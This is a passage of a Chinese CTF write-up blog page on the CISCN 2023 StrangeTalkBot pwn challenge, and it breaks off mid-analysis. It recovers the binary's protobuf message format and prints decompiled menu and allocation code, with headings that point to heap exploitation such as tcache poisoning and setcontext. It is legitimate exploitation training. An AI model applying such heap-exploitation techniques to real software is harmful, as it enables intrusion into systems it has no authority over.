@@ -1,0 +1,1009 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [CISCN 2023]StrangeTalkBot | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="一道 protobuf 序列化的题目，打 setcontext 的方式也比较熟悉，或许打 environ 也可以，没尝试过。    程序分析：main  进到 main 函数，找到该程序反序列化的入口 sub_192D，该函数主要的作用是为了把读进来的原始字节按 protobuf 消息 pwn 解析成一个对象，进去看一看： sub_192D1234char *__fastcall sub_192D">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN 2023]StrangeTalkBot">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/06/09/%5BCISCN%202023%5DStrangeTalkBot/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="一道 protobuf 序列化的题目，打 setcontext 的方式也比较熟悉，或许打 environ 也可以，没尝试过。    程序分析：main  进到 main 函数，找到该程序反序列化的入口 sub_192D，该函数主要的作用是为了把读进来的原始字节按 protobuf 消息 pwn 解析成一个对象，进去看一看： sub_192D1234char *__fastcall sub_192D">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780922774566-a67573b1-1964-4015-870d-4f7ae7fe3d5f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780923701339-51a97da6-7c13-42e1-8e3d-3e0c7fcdfd78.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780923887000-19c62b20-e5b1-4c09-b6c5-5b2bada82e47.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924232790-339a869f-c26b-4ff9-b0d1-fd7d80b623af.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924295852-d05071d2-85cc-4d6d-9d99-adff5b2c3942.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924575986-b0d7079d-3458-4c15-9a77-6a3acb0d0703.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780930149904-39913a40-ce6e-4365-85b8-82ae402c2f7c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780934704383-c4e795d6-1e0f-4c62-a350-ba081f5a3e3f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780936796870-dd345713-4abc-4da8-99a0-64af038e7d7d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780937087043-21584d23-5c68-421e-b391-afeabebf5e4a.png">
+<meta property="article:published_time" content="2026-06-09T02:25:00.000Z">
+<meta property="article:modified_time" content="2026-06-09T12:54:24.455Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="ciscn">
+<meta property="article:tag" content="protobuf">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780922774566-a67573b1-1964-4015-870d-4f7ae7fe3d5f.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[CISCN 2023]StrangeTalkBot">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[CISCN 2023]StrangeTalkBot</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-192D"><span class="toc-number">1.2.</span> <span class="toc-text">sub_192D</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-a55D"><span class="toc-number">1.3.</span> <span class="toc-text">sub_a55D</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.4.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">delete：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">1.6.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">edit：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-base"><span class="toc-number">2.1.</span> <span class="toc-text">泄露 libc_base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastbin-Double-Free"><span class="toc-number">2.2.</span> <span class="toc-text">Fastbin Double Free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tcache-Poisoning-%E5%B0%86-free-hook-%E7%94%B3%E8%AF%B7%E5%87%BA%E6%9D%A5"><span class="toc-number">2.3.</span> <span class="toc-text">Tcache_Poisoning 将 __free_hook 申请出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-base"><span class="toc-number">2.4.</span> <span class="toc-text">泄露 heap_base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E7%BD%AE-ORW"><span class="toc-number">2.5.</span> <span class="toc-text">布置 ORW</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext-61"><span class="toc-number">2.6.</span> <span class="toc-text">setcontext+61</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">总 EXP：</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  <div class="widget-wrapper">
+  <div class="widget-wrap" data-aos="fade-up">
+    <h3 class="widget-title">&#23454;&#26102;&#31449;&#28857;&#32479;&#35745;</h3>
+    <div class="widget">
+      <ul class="archive-list site-stats-list">
+        <li class="archive-list-item site-stats-item">
+          <span class="archive-list-link site-stats-link">
+            <span class="site-stats-label">&#24635;&#35775;&#38382;&#37327;</span>
+            <strong class="site-stats-value" id="sidebar-busuanzi-site-pv">--</strong>
+          </span>
+        </li>
+        <li class="archive-list-item site-stats-item">
+          <span class="archive-list-link site-stats-link">
+            <span class="site-stats-label">&#24635;&#35775;&#23458;&#37327;</span>
+            <strong class="site-stats-value" id="sidebar-busuanzi-site-uv">--</strong>
+          </span>
+        </li>
+      </ul>
+    </div>
+  </div>
+</div>
+<script>
+  (() => {
+    const pvTarget = document.getElementById('sidebar-busuanzi-site-pv');
+    const uvTarget = document.getElementById('sidebar-busuanzi-site-uv');
+    if (!pvTarget || !uvTarget) return;
+
+    const syncBusuanziStats = () => {
+      const pvSource = document.getElementById('busuanzi_value_site_pv');
+      const uvSource = document.getElementById('busuanzi_value_site_uv');
+      const pv = pvSource?.textContent?.trim();
+      const uv = uvSource?.textContent?.trim();
+      if (pv) pvTarget.textContent = pv;
+      if (uv) uvTarget.textContent = uv;
+    };
+
+    syncBusuanziStats();
+    const timer = window.setInterval(syncBusuanziStats, 1000);
+    window.addEventListener('beforeunload', () => window.clearInterval(timer), { once: true });
+  })();
+</script>
+
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-[CISCN 2023]StrangeTalkBot" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-09T02:25:00.000Z" itemprop="datePublished">2026-06-09</time>
+    <time style="display: none;" id="post-update-time">2026-06-09</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-06-09T12:54:24.455Z" itemprop="dateModified">2026-06-09</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>一道 protobuf 序列化的题目，打 setcontext 的方式也比较熟悉，或许打 environ 也可以，没尝试过。</p>
+<hr>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780922774566-a67573b1-1964-4015-870d-4f7ae7fe3d5f.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780923701339-51a97da6-7c13-42e1-8e3d-3e0c7fcdfd78.png"></p>
+<p>进到 main 函数，找到该程序反序列化的入口 sub_192D，该函数主要的作用是为了把读进来的原始字节按 protobuf 消息 pwn 解析成一个对象，进去看一看：</p>
+<h4 id="sub-192D"><a href="#sub-192D" class="headerlink" title="sub_192D"></a>sub_192D</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char *__fastcall sub_192D(_UNKNOWN **a1, unsigned __int64 n5, unsigned __int8 *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090((__int64)&amp;qword_9C80, a1, n5, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780923887000-19c62b20-e5b1-4c09-b6c5-5b2bada82e47.png"></p>
+<p>找到 protobuf</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924232790-339a869f-c26b-4ff9-b0d1-fd7d80b623af.png"></p>
+<p>查找字符串可以看到 msg 开头的在.rodata 的字符串，猜测这个就是我们需要逆向的 protobuf</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924295852-d05071d2-85cc-4d6d-9d99-adff5b2c3942.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780924575986-b0d7079d-3458-4c15-9a77-6a3acb0d0703.png"></p>
+<p>这里 0x9B70 (+0x8)的地方就是 idx，+0x10 偏移的地方就是结构体元素类型：0xF 对应的是 bytes</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">pwn</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>内存数值 (Dec)</strong></th>
+<th><strong>内存数值 (Hex)</strong></th>
+<th><strong>对应 Proto 类型</strong></th>
+<th><strong>底层 Wire Type</strong></th>
+<th><strong>实战内存占用特征</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>0</strong></td>
+<td><code>0x00</code></td>
+<td><code>int32</code></td>
+<td>0 (Varint)</td>
+<td>占 4 字节（有符号）</td>
+</tr>
+<tr>
+<td><strong>1</strong></td>
+<td><code>0x01</code></td>
+<td><code>sint32</code></td>
+<td>0 (Varint)</td>
+<td>占 4 字节（ZigZag 压缩编码）</td>
+</tr>
+<tr>
+<td><strong>2</strong></td>
+<td><code>0x02</code></td>
+<td><code>sfixed32</code></td>
+<td>5 (32-bit)</td>
+<td>占 4 字节（固定长度）</td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td><code>0x03</code></td>
+<td><code>int64</code></td>
+<td>0 (Varint)</td>
+<td>占 8 字节</td>
+</tr>
+<tr>
+<td><strong>4</strong></td>
+<td><code>0x04</code></td>
+<td><code>sint64</code></td>
+<td>0 (Varint)</td>
+<td>占 8 字节</td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td><code>0x05</code></td>
+<td><code>sfixed64</code></td>
+<td>1 (64-bit)</td>
+<td>占 8 字节（固定长度）</td>
+</tr>
+<tr>
+<td><strong>6</strong></td>
+<td><code>0x06</code></td>
+<td><code>uint32</code></td>
+<td>0 (Varint)</td>
+<td>占 4 字节（无符号）</td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td><code>0x07</code></td>
+<td><code>fixed32</code></td>
+<td>5 (32-bit)</td>
+<td>占 4 字节</td>
+</tr>
+<tr>
+<td><strong>8</strong></td>
+<td><code>0x08</code></td>
+<td><code>uint64</code></td>
+<td>0 (Varint)</td>
+<td>占 8 字节</td>
+</tr>
+<tr>
+<td><strong>9</strong></td>
+<td><code>0x09</code></td>
+<td><code>fixed64</code></td>
+<td>1 (64-bit)</td>
+<td>占 8 字节</td>
+</tr>
+<tr>
+<td><strong>10</strong></td>
+<td><code>0x0A</code></td>
+<td><code>float</code></td>
+<td>5 (32-bit)</td>
+<td>占 4 字节</td>
+</tr>
+<tr>
+<td><strong>11</strong></td>
+<td><code>0x0B</code></td>
+<td><code>double</code></td>
+<td>1 (64-bit)</td>
+<td>占 8 字节</td>
+</tr>
+<tr>
+<td><strong>12</strong></td>
+<td><code>0x0C</code></td>
+<td><code>bool</code></td>
+<td>0 (Varint)</td>
+<td>占 4 字节（实际存 0 或 1）</td>
+</tr>
+<tr>
+<td><strong>13</strong></td>
+<td><code>0x0D</code></td>
+<td><code>enum</code></td>
+<td>0 (Varint)</td>
+<td>占 4 字节</td>
+</tr>
+<tr>
+<td><strong>14</strong></td>
+<td><code>0x0E</code></td>
+<td><code>string</code></td>
+<td>2 (Length-del)</td>
+<td>占 8 字节（仅存指向字符串的指针 <code>char*</code>）</td>
+</tr>
+<tr>
+<td><strong>15</strong></td>
+<td><code>0x0F</code></td>
+<td><code>bytes</code></td>
+<td>2 (Length-del)</td>
+<td>占 16 字节（复合结构体 <code>ProtobufCBinaryData</code>）</td>
+</tr>
+<tr>
+<td><strong>16</strong></td>
+<td><code>0x10</code></td>
+<td><code>message</code></td>
+<td>2 (Length-del)</td>
+<td>占 8 字节（指向子 Message 实例的指针）</td>
+</tr>
+</tbody></table>
+<p>在二进制文件同级目录下创建 bot.proto 文件：</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> Devicemsg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">pwn</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=./ ./bot.proto</span><br></pre></td></tr></table></figure>
+
+<p>命令执行成功后，会在 <code>--python_out</code> 当前目录下生成一个专属的 Python 模块文件。</p>
+<p>生成的文件名有严格的固定格式：原文件名 _pb2.py</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780930149904-39913a40-ce6e-4365-85b8-82ae402c2f7c.png">之后我们就可以导入模块：import ez_buf_pb2  编写 exp</p>
+<h4 id="sub-a55D"><a href="#sub-a55D" class="headerlink" title="sub_a55D"></a>sub_a55D</h4><p>这个就是我们的指令菜单了，简单逆向修改了一下函数名和变量名，增加一下可读性，感觉 protobuf 的变量名哪里还是有一点弯弯绕绕，需要仔细分析一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">sub_155D</span><span class="params">(</span></span><br><span class="line"><span class="params">    __int64 n4,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> __int64 idx,</span></span><br><span class="line"><span class="params">    __int64 size_2,</span></span><br><span class="line"><span class="params">    __int64 size,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    buf = size_2;</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0x20</span> )</span><br><span class="line">        exit_0();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)size &gt; <span class="number">0xF0</span> )</span><br><span class="line">        exit_0();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)size_2 &gt; <span class="number">0xF0</span> )</span><br><span class="line">        exit_0();</span><br><span class="line">    <span class="keyword">if</span> ( size_2 &lt; size )</span><br><span class="line">        buf = size;</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> delete(idx);</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> __int8 *)show(idx);</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> __int8 *)add(idx, buf, size, content);</span><br><span class="line">    <span class="keyword">if</span> ( n4 != <span class="number">2</span> )</span><br><span class="line">        LABEL_19:</span><br><span class="line">    exit_0();</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> __int8 *)edit(idx, size, content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">add</span><span class="params">(__int64 idx, <span class="type">size_t</span> size, <span class="type">size_t</span> size_1, <span class="type">const</span> <span class="type">void</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    result = (<span class="type">void</span> *)*((_QWORD *)&amp;unk_A460 + idx);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">        *((_QWORD *)&amp;unk_A460 + idx) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        qword_A560[idx] = size;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>(*((<span class="type">void</span> **)&amp;unk_A460 + idx), content, size_1);</span><br><span class="line">    